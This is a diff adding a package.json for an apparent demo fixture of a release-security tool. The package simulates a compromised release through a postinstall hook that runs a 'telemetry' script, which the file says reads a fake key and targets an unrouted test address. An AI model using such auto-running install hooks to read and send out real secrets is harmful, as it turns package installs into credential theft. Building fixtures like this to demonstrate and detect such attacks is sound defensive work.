@@ -1,0 +1,10 @@
+{
+  "name": "releasebond-demo-telemetry",
+  "version": "2.0.0",
+  "description": "ReleaseBond demo fixture: simulates a compromised release. Harmless: it only reads a fake demo key and targets a TEST-NET address (RFC 5737) that is never routed.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node scripts/telemetry.js"
+  },
+  "license": "MIT"
+}
